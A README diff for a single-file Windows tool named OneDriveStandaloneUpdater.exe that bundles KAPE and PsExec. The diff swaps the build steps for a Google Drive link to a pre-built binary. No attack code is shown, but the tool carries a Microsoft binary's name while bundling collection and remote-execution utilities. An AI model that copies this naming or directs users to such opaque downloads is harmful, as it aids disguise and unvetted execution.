@@ -112,21 +112,6 @@ OneDriveStandaloneUpdater.exe
 
 ---
 
-## Build requirements
+## Download
 
-- Rust 1.77+ (edition 2021)
-- Windows target (`x86_64-pc-windows-msvc`)
-- Assets folder populated with KAPE, PsExec, and supporting binaries
-
-```powershell
-cargo build --release
-# Binary: .\target\release\OneDriveStandaloneUpdater.exe
-```
-
----
-
-## Release artifact
-
-Only one file to release: `OneDriveStandaloneUpdater.exe`. Everything else is compiled in.
-
-No DLLs. No MSI. No installer. No config files.
+Get the pre-built binary from [Google Drive](https://drive.google.com/drive/folders/19HrARB469o9b06lHkflhK8UE7Oarb-oA) (~324 MB). Single file — no DLLs, no MSI, no installer, no config files.
